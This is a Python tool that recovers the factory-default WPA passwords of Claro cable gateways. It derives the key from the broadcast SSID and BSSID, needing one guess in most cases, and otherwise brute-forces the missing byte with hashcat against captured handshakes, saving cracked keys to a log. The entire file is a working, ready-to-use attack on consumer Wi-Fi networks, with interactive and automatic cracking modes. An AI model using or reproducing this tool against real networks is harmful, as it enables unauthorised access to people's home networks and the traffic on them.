#!/usr/bin/env python3
"""
claro_wpa_key.py
------------------------------------------------------------
Recover the DEFAULT Wi-Fi password of affected Claro cable gateways from a
captured handshake -- and, for most gateways, straight off the beacon with no
handshake at all.

Default scheme (affected gateways):
    default SSID = CLARO_<band><last 6 hex>   e.g. CLARO_5G3A9C2D / CLARO_2G3A9C2D
    password     = last 8 hex of the device MAC, UPPERCASE   e.g. C23A9C2D

The default SSID reveals 6 of the 8 password characters:
    * the SSID's trailing 6 hex = device MAC octets 4-6  (6 of the 8 chars).
    * the leading octet (octet 3 = the first 2 password chars) is the MAC's 3rd
      OUI byte. On the common SINGLE-OUI gateway the Wi-Fi radio and the modem
      share that OUI, so octet 3 == the captured BSSID's 3rd octet -> the whole
      key is derivable from the beacon with NO handshake (~1 guess). Verified
      across ~1000 live Claro gateways: this holds for essentially all of them.
    * on the occasional SPLIT-OUI gateway (some ARRIS units: Wi-Fi on C8:52:61,
      modem on A8:70:5D) the radio and modem are DIFFERENT OUI blocks, so the
      BSSID's octet 3 is NOT the leading byte. There it falls back to a 256-guess
      mask (?H?H<tail>) resolved by hashcat against a handshake.

So the tool does two things per network:
    1) prints the most-likely key = <BSSID octet 3> + <SSID 6-hex tail>  (type it
       straight in; no handshake needed on single-OUI gateways), and
    2) if you have a handshake, verifies it and -- if that byte is wrong (split
       OUI) -- brute-forces the leading byte over all 256 values.

Only works while the gateway is on its factory-default SSID + password. A renamed
SSID or a user-changed password cannot be derived this way.

Usage (cross-platform - Windows / macOS / Linux, no GUI):
    python claro_wpa_key.py                       # interactive: drag files in / paste paths
    python claro_wpa_key.py capture.hc22000 ...   # one or more captures
    python claro_wpa_key.py -y capture.hc22000    # auto-run hashcat, no prompt
    python claro_wpa_key.py -n capture.hc22000    # just print keys + commands
    python claro_wpa_key.py -d capture.hc22000    # no handshake: derive + save likely keys
"""

import os
import re
import sys
import shlex
import shutil
import argparse
import subprocess

# ---- config -----------------------------------------------------------------
HASH_MODE   = 22000     # 22000 = modern WPA/WPA2 (hcxpcapngtool)
HASHCAT_EXE = None      # None = auto-detect (PATH + common install dirs); or set a full path
CRACK_FILE  = "claro_cracked.txt"   # confirmed cracks appended here (cwd); git-ignored
SAVE_CRACKS = True      # set False, or pass --no-save, to disable the results log
# -----------------------------------------------------------------------------

def _load_ouis():
    """Load the Claro vendor-OUI table from data/claro_ouis.csv (public IEEE
    registry data -- no credentials). Contributors add rows via PR; see
    CONTRIBUTING.md. Returns (vendors: dict OUI->name, split_ouis: set). Falls
    back to a tiny built-in table if the file is missing, so split-OUI detection
    survives even without the data file."""
    vendors, splits = {}, set()
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "data", "claro_ouis.csv")
    try:
        with open(path, encoding="utf-8") as fh:
            for row in fh:
                row = row.strip()
                if not row or row.startswith("#") or row.lower().startswith("oui,"):
                    continue
                cols = [c.strip() for c in row.split(",")]
                oui = cols[0].upper()
                if not re.match(r"^[0-9A-F]{2}(:[0-9A-F]{2}){2}$", oui):
                    continue
                if len(cols) > 1 and cols[1]:
                    vendors[oui] = cols[1]
                if len(cols) > 2 and cols[2].lower() in ("y", "yes", "split", "true", "1"):
                    splits.add(oui)
    except OSError:
        pass
    if not vendors:                       # data file missing -> keep the essentials
        vendors = {"C8:52:61": "Arris/CommScope router (split-OUI)"}
        splits = {"C8:52:61"}
    return vendors, splits


# Purely informational: labels a gateway's likely maker and flags split-OUI
# units. Loaded from data/claro_ouis.csv (PR-friendly). Unknown OUI != invalid.
OUI_VENDORS, SPLIT_OUIS = _load_ouis()


# ---- color (ANSI, cross-platform, stdlib only) ------------------------------
class _Palette:
    def __init__(self, on):
        e = (lambda c: c) if on else (lambda c: "")
        self.reset  = e("\033[0m")
        self.bold   = e("\033[1m")
        self.dim    = e("\033[90m")   # bright-black (gray) - more legible than the faint 2m attr
        self.cyan   = e("\033[36m")
        self.yellow = e("\033[33m")
        self.green  = e("\033[32m")
        self.red    = e("\033[31m")


C = _Palette(False)   # replaced in main() once we know the terminal


def _enable_windows_ansi():
    """Turn on ANSI/VT processing in the Windows console. No-op elsewhere."""
    if os.name != "nt":
        return True
    try:
        import ctypes
        k = ctypes.windll.kernel32
        mode = ctypes.c_uint32()
        h = k.GetStdHandle(-11)          # STD_OUTPUT_HANDLE
        if not k.GetConsoleMode(h, ctypes.byref(mode)):
            return False
        k.SetConsoleMode(h, mode.value | 0x0004)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        return True
    except Exception:
        return False


def setup_color(mode):
    """mode: 'auto' | 'always' | 'never'. Honors the NO_COLOR env var. Returns a
    _Palette whose codes are empty strings when color is off."""
    if mode == "never" or os.environ.get("NO_COLOR") is not None:
        return _Palette(False)
    if mode == "always":
        _enable_windows_ansi()          # best-effort for a real console; emit codes regardless
        return _Palette(True)
    # auto: only when writing to a real terminal
    on = sys.stdout.isatty()
    if on and os.name == "nt" and not _enable_windows_ansi():
        # VT couldn't be enabled; keep color only for terminals known to grok ANSI
        on = any(os.environ.get(v) for v in ("WT_SESSION", "MSYSTEM", "TERM"))
    return _Palette(on)


def find_hashcat():
    if HASHCAT_EXE and os.path.isfile(HASHCAT_EXE):
        return HASHCAT_EXE
    exe = shutil.which("hashcat") or shutil.which("hashcat.exe")
    if exe:
        return exe
    for c in (r"C:\Tools\hashcat\hashcat.exe", r"C:\hashcat\hashcat.exe",
              os.path.expanduser(r"~\hashcat\hashcat.exe")):
        if os.path.isfile(c):
            return c
    return None


def mac_pretty(b):
    return ":".join(b[i:i + 2] for i in range(0, 12, 2)).upper()


def oui_of(bssid12):
    """'xxxxxxxxxxxx' -> 'XX:XX:XX' (first three octets)."""
    b = bssid12.upper()
    return f"{b[0:2]}:{b[2:4]}:{b[4:6]}"


def parse_22000(path):
    """[{essid, bssid}] for each unique network in a .hc22000 file."""
    seen = {}
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or not line.upper().startswith("WPA"):
                continue
            parts = line.split("*")
            if len(parts) < 6:
                continue
            bssid = parts[3].lower()
            if len(bssid) != 12 or any(c not in "0123456789abcdef" for c in bssid):
                continue
            try:
                essid = bytes.fromhex(parts[5]).decode("utf-8", "replace")
            except ValueError:
                essid = ""
            key = (bssid, parts[5])
            if key not in seen:
                seen[key] = {"essid": essid, "bssid": bssid}
    return list(seen.values())


# Default-format Claro SSID. Handles every variant seen in the field:
#   CLARO_2G3A9C2D  CLARO_5G3A9C2D  CLARO_3A9C2D (no band)
#   CLARO_3A9C2D-5G-BH (mesh backhaul)  CLARO_3A9C2D-IoT  CLARO_2G3A9C2D-2
# All embed the 6-hex device tail right after the (optional) band token. A rare
# variant embeds the full 8 hex.
_SSID_RE = re.compile(r'^CLARO_(?:2\.4G|2G|5G)?([0-9A-Fa-f]{6,12})(?![0-9A-Fa-f])',
                      re.IGNORECASE)


def parse_claro_ssid(essid):
    """
    -> (tail6, full8) where tail6 is the known last 6 hex (MAC octets 4-6,
    lowercase) and full8 is the complete 8-hex password if the SSID embeds it,
    else None. Returns (None, None) for anything that isn't a default Claro SSID
    (renamed networks like CLARO_MOVEL, CLARO_Mesh, etc. fall out here).
    """
    m = _SSID_RE.match((essid or "").strip())
    if not m:
        return None, None
    hexrun = m.group(1).lower()
    if len(hexrun) >= 8:
        return hexrun[-6:], hexrun[-8:]
    if len(hexrun) == 6:
        return hexrun, None
    return None, None


def copy_to_clipboard(text):
    try:
        subprocess.run("clip", input=text.encode("utf-16-le"), check=True)
        return True
    except Exception:
        return False


def hashcat_show(exe, path):
    try:
        r = subprocess.run([exe, "-m", str(HASH_MODE), path, "--show"],
                           capture_output=True, text=True, cwd=os.path.dirname(exe))
        return (r.stdout or "").strip()
    except Exception:
        return ""


def _run_hashcat(exe, path, mask):
    subprocess.run([exe, "-m", str(HASH_MODE), "-a", "3", path, mask],
                   cwd=os.path.dirname(exe))
    return hashcat_show(exe, path)


RULE = "-" * 70
BAR  = "=" * 70
CONT = " " * 14          # continuation indent, aligns under a kv() value


def kv(label, value):
    """'  Label       value' — labels padded (and dimmed) so values line up."""
    print(f"  {C.dim}{label:<11}{C.reset} {value}")


def save_crack(net, password, method, capture):
    """Append a recovered key (beacon-derived or hashcat-confirmed) to CRACK_FILE
    in the cwd. Returns the path, or None if saving is off / failed. This file is
    real credential material and is git-ignored -- never commit it."""
    if not SAVE_CRACKS:
        return None
    import datetime
    out = os.path.abspath(CRACK_FILE)
    new = not os.path.exists(out)
    try:
        with open(out, "a", encoding="utf-8") as fh:
            if new:
                fh.write("# claro_wpa_key.py recovered keys - KEEP PRIVATE (git-ignored)\n")
                fh.write("# method column: 'derived*' = from beacon (no handshake); "
                         "'single-OUI'/'split-OUI' = hashcat-confirmed\n")
                fh.write("# timestamp\tSSID\tBSSID\tpassword\tmethod\tcapture\n")
            ts = datetime.datetime.now().isoformat(timespec="seconds")
            fh.write(f"{ts}\t{net['essid']}\t{mac_pretty(net['bssid'])}\t"
                     f"{password}\t{method}\t{os.path.basename(capture)}\n")
        return out
    except OSError as exc:
        print(f"    (could not save result: {exc})")
        return None


def _save_derived(net, key, full8, oui, capture):
    """Save the beacon-derived likely key with no hashcat. Skips split-OUI blocks,
    where the derived leading byte is probably wrong and needs a handshake."""
    if oui in SPLIT_OUIS and not full8:
        print()
        print(f"  {C.yellow}Not saved - split-OUI block: the derived key is probably wrong.{C.reset}")
        print(f"  {C.yellow}Run hashcat against a handshake to confirm before trusting it.{C.reset}")
        return
    method = "derived-full8 (determined)" if full8 else "derived (unconfirmed)"
    saved = save_crack(net, key, method, capture)
    if saved:
        print(f"\n  {C.dim}saved (derived) to:  {saved}{C.reset}")


def _cracked(out, headline, net, capture):
    print()
    print(f"  {C.bold}{C.green}*** CRACKED ***{C.reset} {C.dim}{headline}{C.reset}")
    saved = None
    for line in out.splitlines():
        pw = line.rsplit(":", 1)[-1]
        print(f"    {C.dim}password:{C.reset}  {C.bold}{C.green}{pw}{C.reset}")
        saved = save_crack(net, pw, headline, capture) or saved
    if saved:
        print(f"    {C.dim}saved to:  {saved}{C.reset}")


def handle_net(idx, total, path, net, exe, run_mode):
    tag = f"[ network {idx}/{total} ]"
    print()
    print(f"{C.dim}{tag} {'-' * (70 - len(tag) - 1)}{C.reset}")
    print()
    kv("SSID", net["essid"] or "(hidden/none)")
    kv("BSSID", mac_pretty(net["bssid"]))

    tail6, full8 = parse_claro_ssid(net["essid"])
    if not tail6:
        print()
        print(f"  {C.yellow}SKIPPED - not a CLARO_ default SSID.{C.reset}")
        print(f"  {C.dim}          Renamed networks can't be derived from the name.{C.reset}")
        return

    oui = oui_of(net["bssid"])
    vendor = OUI_VENDORS.get(oui)
    if vendor and oui in SPLIT_OUIS:
        kv("Vendor", f"{oui}  ({C.red}{vendor}{C.reset})")
    elif vendor:
        kv("Vendor", f"{oui}  {C.dim}({vendor}){C.reset}")
    else:
        kv("Vendor", f"{oui}  {C.dim}(not a known Claro block - may still be valid){C.reset}")

    tail_u = tail6.upper()
    derivation = (f"{CONT}{C.dim}={C.reset} BSSID octet 3 ({C.cyan}{net['bssid'][4:6].upper()}"
                  f"{C.reset}) + SSID tail ({C.yellow}{tail_u}{C.reset})")
    print()

    if full8:
        key = full8.upper()
        kv("PASSWORD", f"{C.bold}{C.green}{key}{C.reset}")
        print(f"{CONT}{C.dim}SSID embeds the full 8-hex tail -> key is determined.{C.reset}")
        mask_primary, mask_fallback = key, None
    else:
        oct3 = net["bssid"][4:6].upper()                 # radio MAC octet 3
        key = oct3 + tail_u                              # H1: single-OUI candidate
        mask_primary, mask_fallback = key, "?H?H" + tail_u
        if oui in SPLIT_OUIS:
            kv("KEY GUESS", f"{C.bold}{C.red}{key}{C.reset}")
            print(derivation)
            print(f"{CONT}{C.yellow}...but {oui} is a split-OUI block: the radio and modem are")
            print(f"{CONT}different vendors, so this leading byte is probably WRONG.")
            print(f"{CONT}Use the 256-guess against a handshake (below).{C.reset}")
        else:
            kv("LIKELY KEY", f"{C.bold}{C.green}{key}{C.reset}")
            print(derivation)
            print(f"{CONT}{C.dim}Single-OUI gateway: type this straight in - no handshake needed.{C.reset}")

    if (full8 or oui not in SPLIT_OUIS) and copy_to_clipboard(key):
        print(f"{CONT}{C.dim}(copied to clipboard){C.reset}")

    if mask_fallback and oui not in SPLIT_OUIS:
        print()
        print(f"  {C.dim}If that key is wrong, this is a rare split-OUI gateway (e.g. some")
        print("  ARRIS): the leading byte isn't in the beacon, so brute all 256 of")
        print(f"  it against a captured handshake with the fallback below.{C.reset}")

    # Display commands with just the filename (quoted only if it has spaces) so
    # long absolute paths don't wrap; run them from the capture's folder.
    base = os.path.basename(path)
    fq = f'"{base}"' if " " in base else base
    e = "hashcat"
    print()
    print(f"  {C.dim}hashcat  (run from this file's folder){C.reset}")
    kv("  1-guess" if mask_fallback else "  verify",
       f'{e} -m {HASH_MODE} -a 3 {fq} {mask_primary}')
    if mask_fallback:
        print()
        print()
        kv("  256-guess", f'{e} -m {HASH_MODE} -a 3 {fq} {mask_fallback}')

    if run_mode == "derive":
        _save_derived(net, key, full8, oui, path)
        return

    if exe is None:
        return  # single hashcat-not-found notice printed once at the end
    if run_mode == "no":
        return
    if run_mode == "ask":
        print()
        if input("  Run hashcat now to verify? [y/N] ").strip().lower() != "y":
            return

    print(f"\n  {C.dim}Trying the 1-guess likely key ...{C.reset}\n")
    out = _run_hashcat(exe, path, mask_primary)
    if out:
        _cracked(out, "single-OUI (leading byte = BSSID octet 3)", net, path)
        return
    if not mask_fallback:
        print(f"\n  {C.yellow}No match - not on the default key (renamed SSID / changed password).{C.reset}")
        return

    print(f"\n  {C.dim}1-guess missed -> split-OUI gateway; brute-forcing the byte (256) ...{C.reset}\n")
    out = _run_hashcat(exe, path, mask_fallback)
    if not out:
        print(f"\n  {C.yellow}No match - not on the default key (renamed SSID / changed password).{C.reset}")
        return
    _cracked(out, "split-OUI (leading byte differed from the BSSID)", net, path)


def capture_mode(path, exe, run_mode, file_no=None, file_total=None):
    path = os.path.abspath(path)
    base = os.path.basename(path)
    where = (f"{C.dim}file {file_no}/{file_total}:{C.reset} " if file_total and file_total > 1
             else "")
    print()
    print(f"{C.dim}{BAR}{C.reset}")
    print(f"  {C.bold}CLARO Default WPA Key{C.reset}   {C.dim}-{C.reset}   {where}{C.bold}{base}{C.reset}")
    if not os.path.isfile(path):
        print(f"  {C.red}!! file not found{C.reset}")
        print(f"{C.dim}{BAR}{C.reset}")
        return
    nets = parse_22000(path)
    if not nets:
        print(f"  {C.red}!! no valid WPA*01 / WPA*02 lines - is this really a .hc22000?{C.reset}")
        print(f"{C.dim}{BAR}{C.reset}")
        return
    print(f"  {len(nets)} network(s) in this capture")
    print(f"{C.dim}{BAR}{C.reset}")
    for i, net in enumerate(nets, 1):
        handle_net(i, len(nets), path, net, exe, run_mode)


def print_no_hashcat_banner():
    print()
    print(f"{C.dim}{BAR}{C.reset}")
    print(f"  {C.yellow}hashcat was NOT found - couldn't auto-run the crack.{C.reset}")
    print()
    print("  That's fine: the likely key above is still valid - just type it into")
    print("  the Wi-Fi password box (works on single-OUI gateways). To let this tool")
    print("  run hashcat for you, do ONE of:")
    print("    - install hashcat and add it to your PATH, or")
    print("    - set HASHCAT_EXE at the top of claro_wpa_key.py to hashcat.exe, e.g.")
    print(r'         HASHCAT_EXE = r"C:\Tools\hashcat\hashcat.exe"')
    print(f"{C.dim}{BAR}{C.reset}")


def _clean_path(tok):
    tok = tok.strip()
    if len(tok) >= 2 and tok[0] == tok[-1] and tok[0] in "\"'":
        tok = tok[1:-1]
    return tok


def _tokens_from_line(line):
    """Split an interactively-typed line into tokens (paths and/or flags),
    tolerating drag-and-drop: quoted paths, backslashes, several at once."""
    try:
        toks = shlex.split(line, posix=False)
    except ValueError:
        toks = line.split()
    return [t for t in (_clean_path(t) for t in toks) if t]


MODE_LABEL = {
    "ask":    "ask before running hashcat",
    "yes":    "auto-run hashcat",
    "no":     "print only (no hashcat)",
    "derive": "derive + save likely keys (no handshake)",
}


def _print_options(run_mode, exe):
    o = C.yellow  # option tokens
    print(f"  {C.dim}Options - set at launch (e.g. python claro_wpa_key.py -d) or type one here:{C.reset}")
    print(f"    {o}-y / --run{C.reset}      auto-run hashcat for every network")
    print(f"    {o}-n / --no-run{C.reset}   just print the keys + commands (no hashcat)")
    print(f"    {o}-d / --derive{C.reset}   no handshake - derive + save the likely key(s)")
    print(f"    {o}--no-save{C.reset}       don't write recovered keys to {CRACK_FILE}  ({o}--save{C.reset} re-enables)")
    print(f"    {C.dim}(default)       show keys, then ask before running hashcat{C.reset}")
    print()
    hc = f"{C.green}found{C.reset}" if exe else f"{C.yellow}not found{C.reset}"
    print(f"  {C.dim}Mode:{C.reset} {C.bold}{MODE_LABEL[run_mode]}{C.reset}   {C.dim}*{C.reset}   "
          f"{C.dim}saving:{C.reset} {'on' if SAVE_CRACKS else 'off'}   {C.dim}*{C.reset}   "
          f"{C.dim}hashcat:{C.reset} {hc}")


def _launched_standalone():
    """True when this process was double-clicked or a file was dragged onto it on
    Windows, so its console window would vanish the instant we return. False when
    run from an existing shell, where a keep-open pause would just annoy.

    Walks the parent-process chain: a shell ancestor (cmd/powershell/bash/...) →
    run from a terminal → False; an explorer.exe ancestor reached first → launched
    from the GUI → True. The chain is walked (not just the immediate parent)
    because the Windows .py association goes Explorer → py.exe → python.exe, so
    the real launcher is a grandparent. Falls back to "this process owns the
    console alone" if the walk is inconclusive."""
    if os.name != "nt":
        return False
    procs = {}
    try:
        import ctypes
        from ctypes import wintypes

        class _PE32(ctypes.Structure):
            _fields_ = [("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD),
                        ("th32ProcessID", wintypes.DWORD),
                        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                        ("th32ModuleID", wintypes.DWORD), ("cntThreads", wintypes.DWORD),
                        ("th32ParentProcessID", wintypes.DWORD),
                        ("pcPriClassBase", ctypes.c_long), ("dwFlags", wintypes.DWORD),
                        ("szExeFile", ctypes.c_char * 260)]

        k = ctypes.windll.kernel32
        snap = k.CreateToolhelp32Snapshot(0x2, 0)     # TH32CS_SNAPPROCESS
        if snap not in (-1, None):
            e = _PE32(); e.dwSize = ctypes.sizeof(_PE32)
            ok = k.Process32First(snap, ctypes.byref(e))
            while ok:
                procs[e.th32ProcessID] = (e.th32ParentProcessID,
                                          e.szExeFile.decode("latin-1").lower())
                ok = k.Process32Next(snap, ctypes.byref(e))
            k.CloseHandle(snap)

        shells = {"cmd.exe", "powershell.exe", "pwsh.exe", "bash.exe", "sh.exe",
                  "zsh.exe", "fish.exe", "wt.exe", "windowsterminal.exe",
                  "mintty.exe", "conemu.exe", "conemu64.exe", "code.exe",
                  "cursor.exe", "alacritty.exe", "wezterm-gui.exe"}
        cur, seen = os.getpid(), set()
        while cur in procs and cur not in seen:
            seen.add(cur)
            ppid = procs[cur][0]
            parent = procs.get(ppid)
            if not parent:
                break
            name = parent[1]
            if name in shells:
                return False
            if name == "explorer.exe":
                return True
            cur = ppid
    except Exception:
        pass
    # Inconclusive walk → fall back to owning the console alone (direct python.exe
    # double-click, no launcher in between).
    try:
        import ctypes
        arr = (ctypes.c_uint * 4)()
        return ctypes.windll.kernel32.GetConsoleProcessList(arr, 4) <= 1
    except Exception:
        return False


def _interactive(exe, run_mode, intro=True):
    """Prompt loop: drop capture file(s) (or paste paths), switch flags inline,
    and keep the window open until a blank line / Ctrl-C. Shared by the
    no-argument launch and the keep-open pause after a drag-and-drop run."""
    global SAVE_CRACKS
    if intro:
        print(f"{C.dim}{BAR}{C.reset}")
        print(f"  {C.bold}CLARO Default WPA Key{C.reset}")
        print(f"{C.dim}{BAR}{C.reset}")
        print("  Drag .hc22000 file(s) into this window (or paste path[s]), then Enter.")
        print(f"  {C.dim}Blank line or Ctrl-C to quit.{C.reset}")
        print()
        _print_options(run_mode, exe)
    while True:
        try:
            line = input("\n> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            break
        toks = _tokens_from_line(line)
        flags = [t for t in toks if t.startswith("-")]
        files = [t for t in toks if not t.startswith("-")]
        for f in flags:
            fl = f.lower()
            if fl in ("-y", "--run"):
                run_mode = "yes"
            elif fl in ("-n", "--no-run"):
                run_mode = "no"
            elif fl in ("-d", "--derive"):
                run_mode = "derive"
            elif fl == "--no-save":
                SAVE_CRACKS = False
            elif fl == "--save":
                SAVE_CRACKS = True
            elif fl in ("-h", "--help"):
                _print_options(run_mode, exe)
            else:
                print(f"  {C.yellow}unknown option '{f}'{C.reset} - try -y, -n, -d, --no-save, or -h")
        for i, p in enumerate(files, 1):
            capture_mode(p, exe, run_mode, i, len(files))
        if flags and not files:
            print(f"  {C.dim}Mode:{C.reset} {C.bold}{MODE_LABEL[run_mode]}{C.reset}   "
                  f"{C.dim}*   saving: {'on' if SAVE_CRACKS else 'off'}{C.reset}")


def main():
    global SAVE_CRACKS, C
    ap = argparse.ArgumentParser(
        prog="claro_wpa_key.py",
        description="Recover the default Wi-Fi key of affected Claro gateways "
                    "from a .hc22000 capture. Run with no arguments for an "
                    "interactive prompt (drag files in or paste paths).")
    ap.add_argument("paths", nargs="*", help=".hc22000 capture file(s)")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("-y", "--run", action="store_true",
                   help="auto-run hashcat for every network (no per-network prompt)")
    g.add_argument("-n", "--no-run", action="store_true",
                   help="never run hashcat; just print the keys and commands")
    g.add_argument("-d", "--derive", action="store_true",
                   help="no-handshake mode: derive the likely key(s) and save them "
                        "(marked unconfirmed); doesn't run hashcat")
    ap.add_argument("--no-save", action="store_true",
                    help=f"don't write anything to {CRACK_FILE}")
    ap.add_argument("--color", choices=("auto", "always", "never"), default="auto",
                    help="colored output (default: auto - on for a real terminal)")
    ap.add_argument("--no-color", action="store_true", help="alias for --color never")
    args = ap.parse_args()
    run_mode = ("yes" if args.run else "no" if args.no_run
                else "derive" if args.derive else "ask")
    if args.no_save:
        SAVE_CRACKS = False
    C = setup_color("never" if args.no_color else args.color)

    exe = find_hashcat()
    paths = [_clean_path(p) for p in args.paths]

    if paths:
        for i, p in enumerate(paths, 1):
            capture_mode(p, exe, run_mode, i, len(paths))
        # A drag-and-drop / double-click launch gets its own console window that
        # would vanish the instant we return — even (especially) when the capture
        # had no CLARO_ networks and there's nothing but a "skipped" line to read.
        # Keep it open, and let more files be dropped in.
        if _launched_standalone():
            print()
            print(f"  {C.dim}Drop more .hc22000 files to check, or press Enter to quit.{C.reset}")
            _interactive(exe, run_mode, intro=False)
    else:
        _interactive(exe, run_mode, intro=True)

    if exe is None:
        print_no_hashcat_banner()


if __name__ == "__main__":
    main()
